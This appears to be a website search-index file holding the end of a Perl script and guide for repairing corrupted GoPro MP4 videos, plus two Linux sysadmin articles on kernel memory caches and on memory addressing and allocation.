%6 == 0) || ($i %6 == 3)) { $stbl .= pack (\"NN\",1,0x1199); } elsif (($i %6 == 1) || ($i %6 == 5)) { $stbl .= pack (\"NN\",1,1); } else { $stbl .= pack (\"NN\",1,0); } } } else { for ($i=$ctts_offset;$i \u003c $framecount + $ctts_offset;$i++){ if ($i % 3 == 0) { $stbl .= pack (\"NN\",1,0x2331); } else { $stbl .= pack (\"NN\",1,0); } } } $stbl .= pack (\"NA4N5\",0x1c,'stsc',0,1,1,1,1); $stbl .= pack (\"NA4N3\",4*$framecount + 0x14, 'stsz',0,0,$framecount); for ($i=0;$i \u003c $framecount;$i++){ $stbl .= pack (\"N\",$szs[$i]); } $stbl .= pack (\"NA4N2\",4*$framecount + 0x10, 'stco',0,$framecount); for ($i=0;$i \u003c $framecount;$i++){ $stbl .= pack (\"N\",$ptrs[$i] + $offset); } #fake stss because I don't know how to re-calculate it $stbl .= pack (\"NA4N3\",0x14,'stss',0,1,1); $stbl .= pack (\"NA4N\",$framecount + 0xc,'sdtp',0); if ($height == 1080) { for ($i=0;$i \u003c $framecount;$i++){ $stbl .= pack (\"C\",0); } } else { for ($i=0;$i \u003c $framecount;$i++){ if ($i % 3 == 0) { $stbl .= pack (\"C\",0); } else { $stbl .= pack (\"C\",0x08); } } } #moov print OUTFILE pack(\"NA4\",$hdrsize-0x20,'moov'); print OUTFILE pack (\"NA4N25\",0x6c,'mvhd',0,0,0,0x015f90,2700000 / $framerate / 0x1d * $framecount, 0x010000, 0x01000000, 0, 0, 0x010000,0,0,0,0x010000,0,0,0,0x40000000,0,0,0,0,0,0,3); print OUTFILE pack (\"NA4\",0x180,'udta'); if ($height == 960) { print OUTFILE pack (\"NA4N30\",0x80,'AMBA',0x040003,0x01030f00,0x04,0x1776,0x02bf20,0xb71b00,0xb71b00,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x0100); } elsif ($height == 1080) { print OUTFILE pack (\"NA4N30\",0x80,'AMBA',0x100009,0x01010800,0x04,0x0bbb * (3-($framerate/30)),0x02bf20,0xb71b00,0xb71b00,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x0100); } else { print OUTFILE pack (\"NA4N30\",0x80,'AMBA',0x100009,0x01030f00,0x04,0x0bbb * (3-($framerate/30)),0x02bf20,0x7a1200,0x7a1200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0x0100); } print OUTFILE pack (\"NA4N60\",0xf8,'free',(0)x60); print OUTFILE pack (\"NA4\",0x16a + length($stbl), 'trak'); print OUTFILE pack (\"NA4N19n4\",0x5c,'tkhd',0x07,0,0,1,0,2700000 / $framerate / 0x1d * $framecount,0,0,0,0,0x10000,0,0,0,0x10000,0,0,0,0x40000000,$width,0,$height,0); print OUTFILE pack (\"NA4\",0x24,'edts'); print OUTFILE pack (\"NA4N5\",0x1c,'elst',0,1,0x015f90 / 0x1d * $framecount, 90090/$framerate,0x10000); print OUTFILE pack (\"NA4\",0x44, 'tapt'); print OUTFILE pack (\"NA4Nn4\",0x14,'clef',0,$width,0,$height,0); print OUTFILE pack (\"NA4Nn4\",0x14,'prof',0,$width,0,$height,0); print OUTFILE pack (\"NA4Nn4\",0x14,'enof',0,$width,0,$height,0); print OUTFILE pack (\"NA4\", 0x9e + length($stbl), 'mdia'); print OUTFILE pack (\"NA4N6\", 0x20, 'mdhd', 0,0,0,0x015f90,0x015f90 / 0x1d * $framecount,0); print OUTFILE pack (\"NA4N2A4N3CA13\", 0x2e, 'hdlr', 0,0, 'vide',0,0,0,0xd,'Ambarella AVC'); print OUTFILE pack (\"NA4\",0x48 + length ($stbl), 'minf'); print OUTFILE pack (\"NA4N3\", 0x14, 'vmhd', 1,0,0,); print OUTFILE pack (\"NA4\",0x24,'dinf'); print OUTFILE pack (\"NA4N2\",0x1c,'dref',0,1); print OUTFILE pack (\"NA4N\",0xc,'url ',1); print OUTFILE pack (\"NA4\", 0x8+length($stbl),'stbl'); print OUTFILE $stbl; print OUTFILE pack (\"NA4\",$hdrsize - tell OUTFILE, 'free'); for ($i=$hdrsize - tell OUTFILE; $i\u003e0; $i--) { print OUTFILE pack (\"C\",0); } # # Copy data over # print OUTFILE pack (\"NA4\",unpack (\"%123d*\" , pack( \"d*\", @szs)) + 13,'mdat'); seek INFILE, $pmdat + 8, 0; $framecount=0; printf(\"Copying frame ...\"); while ($buff = ) { printf(\"\\b\\b\\b\\b\\b\\b\\b\\b\\b%06d...\", $framecount++); print OUTFILE $buff; } print(\"\\nDone.\\n\"); close OUTFILE; close INFILE; Usage linkPut the fix.pl file in the same folder as your corrupted/unreadable video. Then launch the script from the terminal like this:\nperl ./fix.pl .MP4 -reso -ctts video: specify the name of the video file to repair resolution: indicate if it’s PAL or NTSC, followed by the resolution identifier (look behind the GoPro camera, there are r1, r2…). For NTSC in r3, it would be ntscr3. possible resolutions: palr1, palr2, palr3, palr4, palr5, ntscr1, ntscr2, ntscr3, ntscr4, ntscr5 and 96048HD2 ctts: Start with 0, then increase by 1 if the video quality doesn’t meet your expectations For my part, I was able to recover a 1.4GB video like this:\n\u003e perl ./fix.pl GOPR0029.MP4 -reso palr2 -ctts 0 Attempting to fix GOPR0029.MP4 Found frame 027878 at 53fffffb Opened file GOPR0029.MP4.restore.mp4 for writing Found 27878 (6ce6) frames, or approx 1115s of video at 25fps min size d09, max size 4e3fa from 8004, to 53ffc644 Calculated header size of 0xf8000 Using ctts offset of 0 Using 1280 x 720 @ 25 fps Copying frame 027878... Done. Unfortunately, the last few minutes that weren’t written to the card are missing, and also the audio since it’s not possible to recover the sound with this method.\nYour working video will have the same name as the original in the same location where the video is located, with ‘restore’ added to the name.\nReferences link http://goprohacks.blogspot.fr/2010/11/recuperer-un-fichier-mp4-de-gopro.html ↩︎\n"
            }
        );
    index.add(
            {
                id:  301 ,
                href: "\/Les_caches_m%C3%A9moire\/",
                title: "Memory Caches",
                description: "A comprehensive guide to memory caches in Linux systems, including page allocation, overcommit management, Slab cache, ARP cache, and other memory management concepts.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 12/09/2012 Page Allocation linkDelaying memory allocation when a process requests it is good for performance. Due to reference locality, most programs that request large memory allocations don’t allocate all of it at once. For program memory allocation, it will be done gradually to avoid using more than necessary.\nIt’s important to understand that there is also priority management based on who makes the request. For virtual memory allocation, for example, when the kernel makes a request, the memory is allocated immediately, whereas a user request will be handled gradually as needed. There are good reasons for these allocation choices. In fact, many RAM-intensive programs have sections that are rarely used. It’s therefore unnecessary to load everything into memory if not everything is used. This helps avoid memory waste. A process whose memory allocation has been delayed during the last minute is referenced as being in demand for pagination.\nIt’s possible to tune this allocation a bit for applications that typically allocate large blocks and then free the same memory. It also works well for applications that allocate a lot at once and then quit. You need to adjust the sysctl settings:\nvm.min_free_kbytes= This helps reduce pagination request times; memory is only used for what it really needs, and it can put pressure on ZONE_NORMAL1.\nOvercommit Management linkIt’s advantageous for certain applications to let the kernel allocate more memory than the system can offer. This can be done with virtual memory. Using the vm.overcommit_memory parameter in sysctl, it’s possible to ask the kernel to allow an application to make many small allocations:\nvm.overcommit_memory=1 To disable this feature:\nvm.overcommit_memory=0 It’s also possible to use value 2. This allows overcommitting by an amount equal to the swap size + 50% of physical memory. The 50% can be changed via the ratio parameter:\nvm.overcommit_memory=2 vm.overcommit_ratio=50 To estimate the RAM size needed to avoid an OOM (Out Of Memory) condition for the current system workload:\n\u003e grep -i Committed_AS /proc/meminfo Committed_AS: 3458788 kB Generally, overcommit is useful for scientific applications or those created in Fortran.\nSlab Cache linkThe Slab cache contains pre-allocated memory pools that the kernel will use when it needs to provide space for different types of data structures. When these data structures map only very small pages or are so small that several of them fit into a single page, it’s more efficient for the kernel to allocate pre-allocated memory from the Slab memory space. To get this information:\n\u003e cat /proc/slabinfo slabinfo - version: 2.1 # name : tunables : slabdata ext4_groupinfo_1k 31 60 128 30 1 : tunables 120 60 8 : slabdata 2 2 0 jbd2_1k 0 0 1024 4 1 : tunables 54 27 8 : slabdata 0 0 0 ext4_groupinfo_4k 7419 7420 136 28 1 : tunables 120 60 8 : slabdata 265 265 0 ext4_inode_cache 98966 98980 872 4 1 : tunables 54 27 8 : slabdata 24745 24745 0 ext4_xattr 0 0 88 44 1 : tunables 120 60 8 : slabdata 0 0 0 ext4_free_data 1 67 56 67 1 : tunables 120 60 8 : slabdata 1 1 0 ext4_allocation_context 8 28 136 28 1 : tunables 120 60 8 : slabdata 1 1 0 ext4_prealloc_space 31 37 104 37 1 : tunables 120 60 8 : slabdata 1 1 0 ext4_system_zone 0 0 40 92 1 : tunables 120 60 8 : slabdata 0 0 0 ext4_io_end 1 3 1128 3 1 : tunables 24 12 8 : slabdata 1 1 0 ext4_io_page 53 202 16 202 1 : tunables 120 60 8 : slabdata 1 1 0 jbd2_inode 1775 2002 48 77 1 : tunables 120 60 8 : slabdata 26 26 0 jbd2_journal_handle 64 144 24 144 1 : tunables 120 60 8 : slabdata 1 1 0 jbd2_journal_head 590 680 112 34 1 : tunables 120 60 8 : slabdata 20 20 0 jbd2_revoke_table 10 202 16 202 1 : tunables 120 60 8 : slabdata 1 1 0 jbd2_revoke_record 0 0 32 112 1 : tunables 120 60 8 : slabdata 0 0 0 kcopyd_job 0 0 3240 2 2 : tunables 24 12 8 : slabdata 0 0 0 io 0 0 64 59 1 : tunables 120 60 8 : slabdata 0 0 0 dm_uevent 0 0 2608 3 2 : tunables 24 12 8 : slabdata 0 0 0 dm_rq_clone_bio_info 0 0 16 202 1 : tunables 120 60 8 : slabdata 0 0 0 dm_rq_target_io 0 0 408 9 1 : tunables 54 27 8 : slabdata 0 0 0 dm_target_io 856 864 24 144 1 : tunables 120 60 8 : slabdata 6 6 0 dm_io 798 920 40 92 1 : tunables 120 60 8 : slabdata 10 10 0 bio-1 7 20 192 20 1 : tunables 120 60 8 : slabdata 1 1 0 sd_ext_cdb 2 112 32 112 1 : tunables 120 60 8 : slabdata 1 1 0 scsi_sense_cache 60 60 128 30 1 : tunables 120 60 8 : slabdata 2 2 0 scsi_cmd_cache 45 45 256 15 1 : tunables 120 60 8 : slabdata 3 3 0 uhci_urb_priv 3 67 56 67 1 : tunables 120 60 8 : slabdata 1 1 0 sgpool-128 2 2 4096 1 1 : tunables 24 12 8 : slabdata 2 2 0 sgpool-64 2 2 2048 2 1 : tunables 24 12 8 : slabdata 1 1 0 [...] For a less detailed view:\n\u003e vmstat -m Cache Num Total Size Pages ext4_groupinfo_1k 31 60 128 30 jbd2_1k 0 0 1024 4 ext4_groupinfo_4k 7419 7420 136 28 ext4_inode_cache 98971 98984 872 4 ext4_xattr 0 0 88 44 ext4_free_data 18 67 56 67 ext4_allocation_context 16 28 136 28 ext4_prealloc_space 37 37 104 37 ext4_system_zone 0 0 40 92 ext4_io_end 2 3 1128 3 ext4_io_page 73 202 16 202 jbd2_inode 1814 2002 48 77 jbd2_journal_handle 9 144 24 144 jbd2_journal_head 609 680 112 34 jbd2_revoke_table 10 202 16 202 jbd2_revoke_record 0 0 32 112 kcopyd_job 0 0 3240 2 io 0 0 64 59 dm_uevent 0 0 2608 3 dm_rq_clone_bio_info 0 0 16 202 dm_rq_target_io 0 0 408 9 dm_target_io 803 864 24 144 dm_io 801 920 40 92 [...] There’s also a utility that allows you to monitor this Slab cache in real time, you can use the slabtop command:\n\u003e slabtop Active / Total Objects (% used) : 468837 / 561926 (83,4%) Active / Total Slabs (% used) : 46669 / 46681 (100,0%) Active / Total Caches (% used) : 108 / 186 (58,1%) Active / Total Size (% used) : 158581,33K / 169955,34K (93,3%) Minimum / Average / Maximum Object : 0,02K / 0,30K / 4096,00K OBJS ACTIVE USE OBJ SIZE SLABS OBJ/SLAB CACHE SIZE NAME 154993 80496 51% 0,10K 4189 37 16756K buffer_head 119300 119300 100% 0,19K 5965 20 23860K dentry 99016 99012 99% 0,85K 24754 4 99016K ext4_inode_cache 28615 24772 86% 0,06K 485 59 1940K size-64 18810 18601 98% 0,17K 855 22 3420K vm_area_struct 15561 12820 82% 0,55K 2223 7 8892K radix_tree_node 15045 14103 93% 0,25K 1003 15 4012K filp 14715 14674 99% 0,14K 545 27 2180K sysfs_dir_cache 14560 11186 76% 0,03K 130 112 520K size-32 12474 11745 94% 0,05K 162 77 648K anon_vma_chain 9420 9218 97% 0,62K 1570 6 6280K shmem_inode_cache 9120 8814 96% 0,50K 1140 8 4560K size-512 [...] When a process references a file, the kernel creates and associates a ‘dentry object’ for each element in its pathname. For example, for /home/pmavro/.zshrc, the kernel will create 4 ‘dentry objects’:\n/ home pmavro zshrc Each dentry object points to the inode associated with its file. To avoid reading from disk each time these same paths are used, the kernel uses the dentry cache where dentry objects are stored. For the same reasons, the kernel also caches information about inodes, which are therefore contained in the slab.\nThe ARP Cache linkMany network performance problems can be due to the ARP cache being too small. By default, it’s limited to 512 soft entries and 1024 hard entries at the Ulimits level. The soft limit becomes a hard limit after 5 seconds. When this limit is exceeded, the kernel performs garbage collection and scans the cache to purge entries to stay below this limit. This garbage collector can also lead to a complete cache deletion. Let’s say your cache is limited to 1 entry but you’re connecting from 2 remote machines. Each incoming and outgoing packet will cause garbage collection and reinsertion into the ARP cache. There will therefore be a permanent change in the cache. To give you an idea of what can happen on a system:\n2\nTo see the ARP entries that map hardware addresses to protocol addresses:\n\u003e grep -i arp /proc/slabinfo arp_cache 4 8 448 8 1 : tunables 54 27 8 : slabdata 1 1 0 Too many ARP entries in the cache put pressure on the ZONE_NORMAL. To list ARP entries, there are 2 solutions:\n\u003e ip neighbor list 10.101.0.254 dev eth0 lladdr 00:25:45:db:71:57 REACHABLE or\n\u003e cat /proc/net/arp IP address HW type Flags HW address Mask Device 10.101.0.254 0x1 0x2 00:25:45:db:71:57 * eth0 To clear the ARP cache:\nip neighbor flush dev eth0 You can make some ARP cache adjustments by specifying the soft limit, hard limit, and how often the garbage collector should run (in seconds):\nnet.ipv4.neigh.default.gc_thresh2= net.ipv4.neigh.default.gc_thresh3= net.ipv4.neigh.default.gc_interval= There is also another option that allows you to set the minimum time of jiffies in user space to cached entries. There are 100 jiffies in user space in 1 second:\nnet.ipv4.neigh.default.locktime= Page Cache linkA very large percentage of pagination activity is due to IO. For reading from disk to memory for example, it forms page cache. Here are the cases of page cache verification for IO requests:\nReading and writing files Reading and writing via block device files Access to memory-mapped files Access that swaps pages Reading directories To see the page cache allocations, just look at the buffer caches:\n\u003e grep -i buffer /proc/meminfo Buffers: 225624 kB It’s possible to tune the page cache memory size:\nvm.lowmem_reserve_ratio= vm.vfs_cache_presure= And it’s also possible to tune the arrival rate:\nvm.page-cluster= vm.zone_reclaim_mode= Anonymous Pages linkIn Linux, only certain types of pages are swapped. There’s no need to swap text-type programs because they already exist on disk. Also, for memory that has been used to store files with modified content, the kernel will take the lead and write the data to the file it belongs to rather than to swap. Only pages that have no association with a file are written to swap.\nThe swap cache is used to keep track of pages that have previously been taken out of swap and haven’t been re-swapped since. If the kernel swaps threads that need to swap a page later, if it finds an entry for this page in the swap cache, it’s possible to swap without having to write to disk.\nThe statm file for each PID allows you to see anonymous pages (here PID 1):\n\u003e cat /proc/1/statm 2659 209 174 9 0 81 0 2659: total program size 209: resident set size (RSS) 174: shared pages (from shared mappings) 9: text (code) 81: data + stack This therefore contains the RSS and shared memory used by a process. But actually the RSS provided by the kernel consists of anonymous and shared pages, hence:\nAnonymous Pages = RSS - Shared\nSysV IPC linkAnother thing that consumes memory is the memory for IPC communications.\nSemaphores allow 2 or more processes to coordinate access to shared resources.\nMessage Queues allow processes to coordinate for message exchanges. Shared memory regions allow processes to communicate by reading and writing to the same memory regions.\nA process may wish to use one of these mechanisms but must make appropriate system calls to access the desired resources.\nIt’s possible to put limits on these IPCs on SYSV systems. To see the current list:\n\u003e ipcs -l ------ Shared Memory Limits -------- max number of segments = 4096 max seg size (kbytes) = 32768 max total shared memory (kbytes) = 8388608 min seg size (bytes) = 1 ------ Semaphore Limits -------- max number of arrays = 128 max semaphores per array = 250 max semaphores system wide = 32000 max ops per semop call = 32 semaphore max value = 32767 ------ Messages Limits -------- max queues system wide = 7599 max size of message (bytes) = 8192 default max size of queue (bytes) = 16384 Using /dev/shm can be a solution to significantly reduce the service time of certain applications. However, be careful when using this system as temporary storage space because it’s in memory. There’s also an ‘ipcrm’ command to force the deletion of shared memory segments. But generally, you’ll never need to use this command.\nIt’s possible to tune these values (present in /proc/sys/kernel) via sysctl:\n\u003e cat sem 250\t32000\t32\t128 250: maximum number of semaphores per semaphore array 32000: maximum number of semaphores allocated on the system side 32: maximum number of operations allocated per semaphore system call 128: number of semaphore arrays If you want to modify them:\nkernel.sem = 250 256000 32 1024 There are other interesting parameters (with their default values):\n# Maximum number of bytes in a message queue kernel.msgmnb=16384 # Maximum number of message identifiers in the queue kernel.msgmni=16 # Maximum size of a message that can be passed to a process (this memory cannot be swapped) kernel.msgmax=8192 # Maximum number of shared memory segments on the system side kernel.shmmni=4096 # Maximum size of shared memory segments that can be created. A 32-bit system supports up to 4G - 1 maximum kernel.shmmax=33554432 # Total amount of shared memory in pages that can be used at once on the system side. This value must be at least kernel.shmmax/PAGE_SIZE (4KiB on 32-bit) kernel.shmall=2097152 For more information, see the man page for proc(5).\nGetting Memory Information linkThere are several solutions for retrieving memory sizes. The most well-known is the free command:\n\u003e free -ltm total used free shared buffers cached Mem: 3801 3520 281 0 224 1822 Low: 3801 3520 281 High: 0 0 0 -/+ buffers/cache: 1473 2328 Swap: 3811 4 3807 Total: 7613 3524 4089 You can also get information from dmesg. As we’ve seen above, it’s possible to get the total size of virtual space from meminfo:\n\u003e grep -i vmalloc /proc/meminfo VmallocTotal: 34359738367 kB VmallocUsed: 560128 kB VmallocChunk: 34359113168 kB To see the largest free chunk size:\n\u003e grep -i chunk /proc/meminfo VmallocChunk: 34359113168 kB For page tables:\n\u003e vmstat -s 3892968 K total memory 3585172 K used memory 1991172 K active memory 1348148 K inactive memory 307796 K free memory 230100 K buffer memory 1822744 K swap cache 3903484 K total swap 4140 K used swap 3899344 K free swap 397323 non-nice user cpu ticks 6518 nice user cpu ticks 102540 system cpu ticks 5898943 idle cpu ticks 146534 IO-wait cpu ticks 1 IRQ cpu ticks 1476 softirq cpu ticks 0 stolen cpu ticks 24899538 pages paged in 24575197 pages paged out 43 pages swapped in 1061 pages swapped out 38389133 interrupts 74156999 CPU context switches 1347436271 boot time 171650 forks For IO allocations, there’s iomem:\n\u003e cat /proc/iomem 00000000-0000ffff : reserved 00010000-0009fbff : System RAM 0009fc00-0009ffff : RAM buffer 000a0000-000bffff : PCI Bus 0000:00 000c0000-000effff : PCI Bus 0000:00 000c0000-000c7fff : Video ROM 000ce800-000cffff : Adapter ROM 000f0000-000fffff : PCI Bus 0000:00 000f0000-000fffff : reserved 000f0000-000fffff : System ROM 00100000-cd9ffbff : System RAM 01000000-01354585 : Kernel code 01354586-0169367f : Kernel data 01727000-01805fff : Kernel bss cd9ffc00-cda53bff : ACPI Non-volatile Storage cda53c00-cda55bff : ACPI Tables cda55c00-dfffffff : reserved cdb00000-dfffffff : PCI Bus 0000:00 d0000000-dfffffff : 0000:00:02.0 e0000000-efffffff : PCI MMCONFIG 0000 [bus 00-ff] e0000000-efffffff : reserved f0000000-fed003ff : reserved f0000000-fec00000 : PCI Bus 0000:00 f0000000-f01fffff : PCI Bus 0000:02 [...] References link Memory Addressing and Allocation#UMA ↩︎\nhttps://vincent.bernat.im/fr/blog/2011-ipv4-route-cache-linux.html ↩︎\n"
            }
        );
    index.add(
            {
                id:  302 ,
                href: "\/L%27adressage_m%C3%A9moire_et_son_allocation\/",
                title: "Memory Addressing and Allocation",
                description: "A comprehensive guide to memory addressing and allocation in Linux systems, covering virtual addressing spaces, memory allocation techniques, NUMA, TLB optimization, and more.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 11/09/2012 Memory Addressing linkFor better efficiency, a computer’s memory is divided into blocks (chunks) called pages. Page size may vary depending on the processor architecture (32 or 64 bits). RAM is divided into page frames. One page frame can contain one page. When a process wants to access a memory address, a translation from the page to the page frame must be performed. If this information is not already in memory, the kernel must perform a search to manually load this page into the page frame.\nWhen a program needs to use memory, it uses a ’linear address’. On 32-bit systems, only 4GB of RAM can be addressed. It’s possible to bypass this limit with a kernel option called PAE1 allowing up to 64GB of RAM. If you need more, you must switch to a 64-bit system which will allow you to use up to 1TB.\nEach process has its own page table. Each PTE (Page Table Entry) contains information about the page frame assigned to a process.\nVirtual Address Space linkA process’s memory in Linux is divided into several sectors:\n2\ntext: the code of the executing process, also known as ’text area' data: data used by the program. Initialized data will be at the beginning, followed by uninitialized data arguments: arguments passed to the program environment: environment variables available to the program heap: used for dynamic memory allocation (also known as brk) stack: used for passing arguments between procedures and dynamic memory Some processes don’t directly manage their memory addressing, leaving two possible solutions:\nThe heap and stack can grow toward each other No more space available, the process fails to free allocated memory (Memory leaks) The virtual memory (VMA) of processes can be viewed this way (here PID 1):\n\u003e cat /proc/1/statm 5361 386 306 35 0 104 0 Here’s another more detailed view (PID 1):\n\u003e cat /proc/1/status Name:\tinit State:\tS (sleeping) Tgid:\t1 Pid:\t1 PPid:\t0 TracerPid:\t0 Uid:\t0\t0\t0\t0 Gid:\t0\t0\t0\t0 Utrace:\t0 FDSize:\t64 Groups: VmPeak:\t21452 kB VmSize:\t21444 kB VmLck:\t0 kB VmHWM:\t1544 kB VmRSS:\t1544 kB VmData:\t328 kB VmStk:\t88 kB VmExe:\t140 kB VmLib:\t2384 kB VmPTE:\t60 kB VmSwap:\t0 kB Threads:\t1 SigQ:\t1/11005 SigPnd:\t0000000000000000 ShdPnd:\t0000000000000000 SigBlk:\t0000000000000000 SigIgn:\t0000000000001000 SigCgt:\t00000001a0016623 CapInh:\t0000000000000000 CapPrm:\tffffffffffffffff CapEff:\tfffffffffffffeff CapBnd:\tffffffffffffffff Cpus_allowed:\t1 Cpus_allowed_list:\t0 Mems_allowed:\t00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001 Mems_allowed_list:\t0 voluntary_ctxt_switches:\t1332 nonvoluntary_ctxt_switches:\t42 You can also get an even more detailed view of the VMA with pmap (PID 1):\n\u003e pmap 1 1: /sbin/init 00007f319151d000 44K r-x-- /lib64/libnss_ldap.so.2 00007f3191528000 2044K ----- /lib64/libnss_ldap.so.2 00007f3191727000 4K rw--- /lib64/libnss_ldap.so.2 00007f3191728000 48K r-x-- /lib64/libnss_files-2.12.so 00007f3191734000 2048K ----- /lib64/libnss_files-2.12.so 00007f3191934000 4K r---- /lib64/libnss_files-2.12.so 00007f3191935000 4K rw--- /lib64/libnss_files-2.12.so 00007f3191936000 1572K r-x-- /lib64/libc-2.12.so 00007f3191abf000 2044K ----- /lib64/libc-2.12.so 00007f3191cbe000 16K r---- /lib64/libc-2.12.so 00007f3191cc2000 4K rw--- /lib64/libc-2.12.so 00007f3191cc3000 20K rw--- [ anon ] 00007f3191cc8000 88K r-x-- /lib64/libgcc_s-4.4.6-20120305.so.1.#prelink#.31mBid (deleted) 00007f3191cde000 2044K ----- /lib64/libgcc_s-4.4.6-20120305.so.1.#prelink#.31mBid (deleted) 00007f3191edd000 4K rw--- /lib64/libgcc_s-4.4.6-20120305.so.1.#prelink#.31mBid (deleted) 00007f3191ede000 28K r-x-- /lib64/librt-2.12.so 00007f3191ee5000 2044K ----- /lib64/librt-2.12.so 00007f31920e4000 4K r---- /lib64/librt-2.12.so 00007f31920e5000 4K rw--- /lib64/librt-2.12.so 00007f31920e6000 92K r-x-- /lib64/libpthread-2.12.so 00007f31920fd000 2048K ----- /lib64/libpthread-2.12.so 00007f31922fd000 4K r---- /lib64/libpthread-2.12.so 00007f31922fe000 4K rw--- /lib64/libpthread-2.12.so 00007f31922ff000 16K rw--- [ anon ] 00007f3192303000 252K r-x-- /lib64/libdbus-1.so.3.4.0 00007f3192342000 2048K ----- /lib64/libdbus-1.so.3.4.0 00007f3192542000 4K r---- /lib64/libdbus-1.so.3.4.0 00007f3192543000 4K rw--- /lib64/libdbus-1.so.3.4.0 00007f3192544000 36K r-x-- /lib64/libnih-dbus.so.1.0.0 00007f319254d000 2044K ----- /lib64/libnih-dbus.so.1.0.0 00007f319274c000 4K r---- /lib64/libnih-dbus.so.1.0.0 00007f319274d000 4K rw--- /lib64/libnih-dbus.so.1.0.0 00007f319274e000 96K r-x-- /lib64/libnih.so.1.0.0 00007f3192766000 2044K ----- /lib64/libnih.so.1.0.0 00007f3192965000 4K r---- /lib64/libnih.so.1.0.0 00007f3192966000 4K rw--- /lib64/libnih.so.1.0.0 00007f3192967000 128K r-x-- /lib64/ld-2.12.so 00007f3192b79000 20K rw--- [ anon ] 00007f3192b85000 4K rw--- [ anon ] 00007f3192b86000 4K r---- /lib64/ld-2.12.so 00007f3192b87000 4K rw--- /lib64/ld-2.12.so 00007f3192b88000 4K rw--- [ anon ] 00007f3192b89000 140K r-x-- /sbin/init 00007f3192dab000 8K r---- /sbin/init 00007f3192dad000 4K rw--- /sbin/init 00007f31946b1000 260K rw--- [ anon ] 00007fffa18c1000 84K rw--- [ stack ] 00007fffa18f1000 4K r-x-- [ anon ] ffffffffff600000 4K r-x-- [ anon ] total 21444K The working sets of a process correspond to a group of pages of a process in memory. A process’s working set continuously changes throughout the program’s life because memory space allocation varies all the time. For memory page allocation, the kernel constantly ensures which pages are not used in the working set. If pages contain modified data, these pages will be written to disk. If there is no data in the pages, they will be reallocated to other processes with more urgent memory needs.\nMemory thrashing occurs when the system spends more time moving pages in and out of a process’s working set than simply working with them.\nUlimits linkThere are limitations on a system. I’ve already written an article about this3. It’s possible to limit memory usage with ulimits. For example, you can define the maximum address space limit.\nPhysical Address Space linkMost processor architectures support different page sizes. For example:\nIA-32: 4KiB, 2MiB and 4MiB. IA-64: 4KiB, 8KiB, 64KiB, 256KiB, 1MiB, 4MiB, 16MiB and 256MiB. The number of TLB entries is fixed but can be expanded by changing the page size.\nVirtual Address Mapping linkWhen the kernel needs to access a particular memory space in a page frame, it refers to a virtual address. This is sent to the MMU (Memory Management Unit) on the processor, referencing a process’s page table. This virtual address will point to a PTE in the page table. The MMU uses information transmitted by the PTE to locate the physical memory page that the virtual one points to. Each PTE contains a bit to indicate whether the page is currently in memory or has been swapped to disk.\n4\nA page table can be likened to a page directory. Paging is done by breaking down the 32 bits of linear addresses that are used as references to memory positions in several places also known as ‘page branching structure’. The last 12 bits reference the memory offset in which the memory page is located. The remaining bits are used to specify the page tables. On a 32-bit system, the 20 bits will require a large page table. The linear address will then be divided into 4 segments:\nPGD: The Page Global Directory PMD: The Page Middle Directory The page table The offset The PGD and PMD can be viewed as page tables that point to other page tables.\nConverting linear addresses to physical ones can take some time, which is why processors have small caches also known as TLB (Translation Lookaside Buffer) that store physical addresses recently associated with virtual ones. The size of a TLB cache is the product of the number of TLBs and a processor’s page size. For example, for a processor with 64 TLBs and 4KiB pages, the TLB cache will be 256KiB (64*4).\nUMA link 5\nOn a 32-bit system, the kernel maps all memory up to 896MiB on the 4GiB linear address space. This allows the kernel to have direct memory access below 896MiB by looking at the linear addressing present in the kernel page tables. The kernel directly maps all memory up to 869KiB except for certain reserved regions:\n0KiB -\u003e 4KiB: region reserved for BIOS (ZONE_DMA) 4KiB -\u003e 640KiB: region mapped in kernel page tables (ZONE_DMA) 640KiB -\u003e 1MiB: region reserved for BIOS and IO-type devices (ZONE_DMA) 1MiB -\u003e end of kernel data structure: for the kernel and its data structures (ZONE_DMA) end of kernel data structure -\u003e 869MiB: region mapped in kernel page tables (ZONE_NORMAL) 896MiB -\u003e 1GiB: for the kernel to map its linear addresses reserved in ZONE_HIGHMEM (PAE)1 6\nOn a 64-bit system, however, it’s much simpler as you can see!\nMemory Allocation linkCOW (Copy on Write) is a form of demand paging. When a process forks a child, the child process inherits the parent’s memory addressing. Instead of wasting CPU cycles copying the parent’s address spaces to the child, COW ensures that the parent and child share the same address space. COW is called this way because as soon as the child or parent tries to write to a page, the kernel will create a copy of this page and assign it to the address space of the process trying to write. This technology saves a lot of time.\nWhen a process refers to a virtual address, several things are done before approving access to the requested memory space:\nVerification that the memory address is valid Every reference a process makes for a page in memory does not necessarily give immediate access to a page frame. This check is also done Each PTE of a process in a page table that contains the bit flag specifying whether the page is present in memory or not is checked Access to non-resident pages in memory will generate page faults These page faults may be due to programming errors (as in many cases) and will represent memory accesses that have not yet been allocated by a process or already swapped to disk It’s important to know that:\nAs soon as a process requests a page that is not present in memory, it will receive a ‘page fault’ error. When virtual memory needs to allocate a new page frame for a process, a ‘minor page fault’ will occur (with the help of the MMU). When the kernel needs to block a process while it is reading from disk, a ‘major page fault’ will occur You can see the current page faults (here the PID is 1):\n\u003e ps -o minflt,majflt 1 MINFLT MAJFLT 1297 7 Different Types of RAM linkMemory cache consists of static random access (SRAM). SRAM is the fastest memory of all RAMs. The advantage of SRAM (static) over dynamic (DRAM) is that it has shorter cycle times and doesn’t need to be refreshed after being read. However, SRAM remains very expensive.\nThere are also:\nSDRAM (Synchronous Dynamic) uses the processor clock to synchronize IO signals. By coordinating memory accesses, response time is reduced. Basically, a 100Mhz SDRAM equals 10ns access time. DDR (Double Data Rate) is a variant of SDRAM and allows reading as soon as it receives rising/falling clock signals. RDRAM (Rambus Dynamic) uses narrow buses to go very fast and increase throughput. SRAM that we just saw The RAMs described above range from slowest to fastest.\nNUMA link 5\nNUMA technology increases MMU performance. A 64-bit processor is mandatory to use this technology. You can check if it’s present at your kernel level:\n\u003e grep -i numa /boot/config-`uname -r` CONFIG_NUMA=y CONFIG_AMD_NUMA=y 